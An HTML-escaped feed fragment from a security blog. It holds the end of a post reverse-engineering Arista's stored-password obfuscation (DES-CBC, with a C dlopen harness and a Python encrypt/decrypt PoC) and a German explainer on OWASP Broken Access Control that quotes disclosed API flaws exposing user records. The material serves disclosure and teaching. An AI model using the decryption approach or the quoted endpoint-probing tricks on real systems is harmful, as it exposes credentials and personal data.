&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;libhandle&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dlopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LIBNAME&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RTLD_LAZY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libhandle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;dlopen(%s, RTLD_LAZY) failed: %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;LIBNAME&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;dlerror&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// find func
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;error_msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dlerror&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dlsym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libhandle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;_Z12getHashedKeyPKciPc&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;error_msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dlerror&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;error_msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;dlsym(%p, &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;getHashedKey&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt; failed: %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;libhandle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;n&#34;&gt;error_msg&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;gethashedKey %p&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keylen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;key&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keylen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;dlclose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libhandle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;killing-dependencies&#34;&gt;
    &lt;a href=&#34;#killing-dependencies&#34;&gt;
	Killing Dependencies
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;That way we can inspect the output of the function (it overwrites the first 8 bytes of &lt;code&gt;data&lt;/code&gt;) and get a reference key value to debug against.
Or could, if that would work.
It does not, because the &lt;code&gt;.so&lt;/code&gt; we open still has listed &lt;code&gt;libtac.so.0&lt;/code&gt; as &lt;code&gt;NEEDED&lt;/code&gt; and we need to fix it.&lt;/p&gt;
&lt;p&gt;There are many ways to edit ELF binaries, but most are badly maintained.
An easy way is a web service such as &lt;a href=&#34;https://elfy.io/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;elfy.io&lt;/a&gt;

.
We upload the library, click &lt;code&gt;Load information&lt;/code&gt; -&amp;gt; &lt;code&gt;Loader directives&lt;/code&gt; and edit the first dependency (&lt;code&gt;libtac.so.0&lt;/code&gt;) (offset 0x270) to point to the second dependency (&lt;code&gt;libpython3.7m.so.1.0&lt;/code&gt; (offset 0x283) instead.
Downloading the code again, we can rename it to &lt;code&gt;libtest.so&lt;/code&gt; and load it with our test program from above, getting a reference key value.
So &lt;code&gt;mydevices_passwd&lt;/code&gt; in a non-broken implementation yields the raw key value of &lt;code&gt;4A 0E 5D 1A 70 4F 1F 23&lt;/code&gt; for DES.&lt;/p&gt;
&lt;p&gt;Having that, debugging can continue.
It turns out: math is hard and Intel is a little-endian architecture:
The seed byte sequence &lt;code&gt;D5 A8 ... 8A 23&lt;/code&gt; is of course the long &lt;code&gt;238A…A8D5&lt;/code&gt;.
I am definitively not doing these things often enough anymore to not make this kind of mistake.&lt;/p&gt;
&lt;h1 id=&#34;progress&#34;&gt;
    &lt;a href=&#34;#progress&#34;&gt;
	Progress!
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Having a working &lt;code&gt;getHashedKey()&lt;/code&gt; we can now look at &lt;code&gt;cbcEncrypt()&lt;/code&gt; and reverse that.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/11/arista-cbcencrypt.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The heart of &lt;code&gt;cbcEncrypt()&lt;/code&gt; fetches two Python &lt;code&gt;bytearray&lt;/code&gt;, &lt;code&gt;key&lt;/code&gt; and &lt;code&gt;data&lt;/code&gt; and works with them. The &lt;code&gt;key&lt;/code&gt; is processed with &lt;code&gt;getHashedKey()&lt;/code&gt;, then &lt;code&gt;cbc_crypt()&lt;/code&gt; is set up and called. The result returned to Python using &lt;code&gt;Py_BuildValue&lt;/code&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The moment we try to build this in C, it proves frustrating again:
&lt;code&gt;cbc_crypt()&lt;/code&gt; is no longer part of &lt;code&gt;libc&lt;/code&gt;.
It is outdated, legacy, but unfortunately still in use.
Not only by Arista, but also other companies and protocols.
Among them some ancient RPC protocols.
It has been removed from &lt;code&gt;libc&lt;/code&gt; and moved to &lt;code&gt;libtirpc3&lt;/code&gt;, it seems.
We need to install &lt;code&gt;libtirpc3&lt;/code&gt;, &lt;code&gt;libtirpc-dev&lt;/code&gt; and &lt;code&gt;libtirpc-common&lt;/code&gt; to be able to build code that calls &lt;code&gt;cbc_crypt()&lt;/code&gt;.
Even then we seem to be limited to static linking, because for some reason the shared objects do no longer export the symbol.&lt;/p&gt;
&lt;p&gt;Some more short short hiccups:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The padding value is a nibble, not a byte, and the long it is part of has to be little endian naturally.&lt;/li&gt;
&lt;li&gt;The padding needs itself to take the 4 bytes added by the padding itself into account.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the end we get code that reproduces the expected result.&lt;/p&gt;
&lt;h1 id=&#34;in-python&#34;&gt;
    &lt;a href=&#34;#in-python&#34;&gt;
	In Python
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;If, and that is important, &lt;code&gt;des_parity()&lt;/code&gt; is being called.
In Python that function is not available, and should not be necessary:
The legacy DES function in Python&amp;rsquo;s module supposedly ignores DES parity bits automatically.&lt;/p&gt;
&lt;p&gt;But the Python code produces a different result.
So what goes on here, and how do we get &lt;code&gt;des_parity()&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;Turns out, &lt;code&gt;des_parity()&lt;/code&gt; is really weird code:
Look at it &lt;a href=&#34;https://github.com/alisw/libtirpc/blob/master/src/des_soft.c#L33-L50&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;

.
It is supposed to make the 8 bytes of the DES code uneven parity by manipulating the low-value bits in the key.
But the actual code also effectively masks out the high order bit, so we do not get 56 bit of keyspace, but only 48 bit.
Yay, export crypto?&lt;/p&gt;
&lt;p&gt;Anyway, this is the code Arista runs for their key obfuscation, so we need to duplicate it to produce correct data.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/isotopp/arista_type_7/blob/main/pypoc.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Here&lt;/a&gt;

 is a PoC in Python.&lt;/p&gt;
&lt;p&gt;With the poc provided, it should be possible to&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;arista_descrypt&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cbc_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cbc_decrypt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;encrypted&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cbc_encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mydevices_passwd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;supersecretpassword&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encrypted&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and that should be sufficient to build an Ansible module for Arista config provisioning.
The code uses &lt;code&gt;cryptography&lt;/code&gt; or &lt;code&gt;pycryptodome&lt;/code&gt; automatically, one of the two is installed.
It is not dependent on the legacy &lt;code&gt;cbc_crypt()&lt;/code&gt; function that formerly was in &lt;code&gt;libc&lt;/code&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>A01:2021 - Broken Access Control</title>
      <link>https://blog.koehntopp.info/2021/11/16/a01-2021-broken-access-control.html</link>
      <pubDate>Tue, 16 Nov 2021 11:28:27 +0100</pubDate>
      
      <guid>https://blog.koehntopp.info/2021/11/16/a01-2021-broken-access-control.html</guid>
      <description>&lt;p&gt;Dieser Artikel wurde von Lenz Grimmer auch &lt;a href=&#34;https://blog.koehntopp.info/2021/11/16/a01-2021-broken-access-control-en.html&#34;&gt;ins Englische&lt;/a&gt;

 übersetzt.&lt;/p&gt;
&lt;p&gt;In einem
&lt;a href=&#34;https://twitter.com/ChristianBasl/status/1459851276817158151&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Twitter-Thread von Christian Basl&lt;/a&gt;


ging es um die von
&lt;a href=&#34;https://zerforschung.org/posts/learnu/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;zerforschte App &amp;ldquo;Learnu&amp;rdquo;&lt;/a&gt;

.
Basl schreibt:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Die Betreiber von Learnu sagen, sie hätten keine Fachkenntnisse in IT-Sicherheit und hätten sich auf externe Berater verlassen.
So kam Learnu unbekannterweise unsicher auf den Markt.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In der sich entwickelnden Diskussion vertrat &lt;a href=&#34;https://twitter.com/ardewes/status/1460240730698493957&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Andreas Dewes&lt;/a&gt;

 den Standpunkt&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Die meisten Start-ups die ich kenne gehen durch eine Phase, in der IT-Sicherheit und Compliance eher im Hintergrund stehen.
Wenn sie größer werden fangen sie an sich darüber Gedanken zu machen u.a. weil Kunden oder Partner Zertifizierungen verlangen, z.B. SOC 2 oder ISO-27001.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Das ist angesichts von &lt;a href=&#34;https://owasp.org/Top10/A01_2021-Broken_Access_Control/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;OWASP A01:2021 - Broken Access Control&lt;/a&gt;

 eine lustige Aussage.
&lt;a href=&#34;https://de.wikipedia.org/wiki/Open_Web_Application_Security_Project&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;OWASP&lt;/a&gt;

 ist eine NGO, die die Sicherheit von Anwendungen und Diensten im Internet verbessern will.
OWASP gibt dazu eine jedes Jahr aktualisierte Top-10 Liste von Sicherheitsproblemen bei Anwendungen heraus.&lt;/p&gt;
&lt;p&gt;Für 2021 hat es im Vergleich zu 2017 die folgenden Änderungen gegeben:&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2021/11/owasp-mapping.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Broken Access Control war 2017 auf Platz 5 und ist jetzt Problem #1. 94 % der getesteten Anwendungen hatten irgendeine Form von defekter Zugangskontrolle. Der ehemalige #1 Dauerbrenner Injection ist nur noch auf Platz 3.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Wir sehen ein klassisches Beispiel dafür in einer anderen Schul-Anwendung, die das Team von Zerforschung getestet hat:
&lt;a href=&#34;https://zerforschung.org/posts/scoolio/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Scoolio&lt;/a&gt;

 wurde aufgemacht, indem die Zerforschis&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ein Endpunkt der Schnittstelle (Application Programming Interface, API) ist uns dabei sofort ins Auge gefallen: &lt;code&gt;/api/v3/Profile/{ProfileID}&lt;/code&gt;.
…
Wenn wir spannnende API-Endpunkte finden, die über eine Versionskomponente verfügen (hier &lt;code&gt;/v3/&lt;/code&gt;), versuchen wir gerne mal, diese zu verändern.
Also wurde in unserem Fall aus &lt;code&gt;/api/v3/Profile/{ProfileID}&lt;/code&gt; zu &lt;code&gt;/api/v2/Profile/{ProfileID}&lt;/code&gt;.
Und tada: Noch viel mehr Daten!
Aber unsere eigenen Daten sind langweilig – die kennen wir ja schon.
Also haben wir auch probiert, eine fremde Profil-ID einzugeben.
Und zu unserer geringen Verwunderung, aber großen Genervtheit, konnten wir natürlich auf diese detaillierten Daten der fremden ID zugreifen.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Das ist ein klassisches &amp;ldquo;A01:2021 - Broken Access Control&amp;rdquo; Beispiel.
Die Anwendung kennt die Identität des Benutzers, denn sie ist in der App eingetragen.
Sie nutzt diese Information nicht, um die Verbindung zum Server zu authentisieren und autorisieren.
Und entsprechend kann die API genutzt werden, um auf beliebige User-Records zuzugreifen, statt nur auf den eigenen.&lt;/p&gt;
&lt;h1 id=&#34;identität-authentisierung-autorisierung-auditing-und-accounting&#34;&gt;
    &lt;a href=&#34;#identit%c3%a4t-authentisierung-autorisierung-auditing-und-accounting&#34;&gt;
	Identität, Authentisierung, Autorisierung, Auditing und Accounting
    &lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;Ein paar Begriffe:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Identität:&lt;/strong&gt; Ich bin ich.
Aber ich kann nicht auf das Web oder eine API zugreifen.
Eine Anwendung muss das an meiner statt tun.
Diese Anwendung verwendet dazu eine eindeutige Benutzerkennung, die &amp;ldquo;mich&amp;rdquo; im Kontext der Anwendung repräsentiert.
Eine Identität mit einem eindeutigem Identifier (einem &amp;ldquo;Principal&amp;rdquo;) der mich repräsentiert ist aber zunächst einmal eine Behauptung.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Authentisierung:&lt;/strong&gt; Ich kann das auch beweisen.
Wenn ich die behauptete Identität beweisen kann, dann bin ich authentisch ich.
Ich bestätige meine Identität meist mit einem Passwort und oft auch mit einem 2. Faktor (etwa einer vom einem Google Authenticator abgetippten wechselnden Geheimnummer).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Die behauptete und bestätigte Identität muss für einige Zwecke auch noch &lt;strong&gt;verankert&lt;/strong&gt; werden, etwa wenn diese Identität an andere Rechte oder Verhältnisse in der realen Welt gebunden werden soll.
Wenn ich zum Beispiel in einer Schul-App eine Schulzugehörigkeit und Klassenzugehörigkeit haben soll, dann ist es unter Umständen gut, wenn ich mir nicht einfach einen Account machen kann.
Stattdessen sollte eine Lehrperson sich das ansehen, mich fragen, ob ich das war und mich dann der Schule und der Klasse zuordnen.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Einer behaupteten, bestätigten und in der realen Welt verankerten Identität werden dann Zugriffsrechte zugeordnet.
Das ist eine &lt;strong&gt;Autorisierung&lt;/strong&gt;, sie bestimmt, was diese Identität im Kontext der Anwendung sehen, schreiben, verändern und löschen darf.
Dazu werden wir unten noch ein wenig mehr reden.&lt;/li&gt;
&lt;li&gt;Was ich dann in der Anwendung tu muss unter Umständen beweiskräftig mitgeschnitten werden.
Etwa dann, wenn die Daten, auf die ich zugreife, besonders schützenswert sind, oder ihre Änderungshistorie dokumentiert werden muss.
Das kann zum Beispiel im Schulkontext meine Ansammlung von Leistungsnachweisen sein.
Ein Logbuch, bei dem Zugriffe zwingend und nicht abschaltbar mit Personenidentitäten verknüpft werden nennt man ein &lt;strong&gt;Audit-Log&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Wenn ich Dienstleistungen in Anspruch nehme, die Geld kosten, dann muss eine besondere Form von Audit-Log geführt werden.
Dieses Audit-Log ist die Grundlage der Rechnungslegung und zeigt, welche Person wann welche kostenpflichtige Dienstleistung in Anspruch genommen hat.
Dieses Logbuch ist Bestandteil des &lt;strong&gt;Accounting&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Man kann zu jedem dieser Themen viel schreiben, aber uns soll hier in erster Linie &lt;em&gt;Autorisierung&lt;/em&gt; beschäftigen, eben weil es Thema #1 bei der aktuellen OWASP Liste ist.
Und weil es nicht nur bei den Zerforschis im
&lt;a href=&#34;https://zerforschung.org/posts/scoolio/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Scoolio&lt;/a&gt;


Artikel auftaucht, sondern noch einmal im
&lt;a href=&#34;https://zerforschung.org/posts/meinschnelltest/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Mein Schnelltest&lt;/a&gt;


Artikel:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Eine der ersten Anfragen, die uns auffällt, geht an &lt;code&gt;https://corona-api.de/persons/owner/{USER_ID}&lt;/code&gt;, wobei &lt;code&gt;USER_ID&lt;/code&gt; natürlich die Nummer unseres Accounts ist – z.B. &lt;code&gt;612341213acab23425251e21&lt;/code&gt;.
… [Wir verkürzen die URL]…
Einen Versuch wagen wir noch und entfernen das / am Ende der URL. Und tada:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET https://corona-api.de/persons
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Uns fällt eine Liste mit den Personen, die auf der Plattform registriert sind, entgegen.
Insgesamt fast 400.000 mit allen Daten, die bei einem Corona-Test eben so erfasst werden.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Zerforschung demonstriert dann auch noch, daß sie in beiden Fällen lustig ihre Identität oder ihre Verankerung (die Schulzugehörigkeit) ändern können (und vermutlich ohne daß das in einem Audit-Log landet), und daß sie nach Belieben Daten schreiben können, indem sie dem 177-jahre alten Robert Koch ein Corona-Testergebnis ausstellen.&lt;/p&gt;
&lt;h1 id=&#34;autorisierung&#34;&gt;
    &lt;a href=&#34;#autorisierung&#34;&gt;
	Autorisierung
    &lt;/a&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;verben-und-subjekt-prädikat-objekt-wer-tut-was-mit-wem&#34;&gt;
    &lt;a href=&#34;#verben-und-subjekt-pr%c3%a4dikat-objekt-wer-tut-was-mit-wem&#34;&gt;
	Verben und Subjekt-Prädikat-Objekt (Wer tut was mit wem?)
    &lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;Eine Anwendung hat eine Außenseite.
Das ist eine Liste aller URLs, die aufrufbar sind.
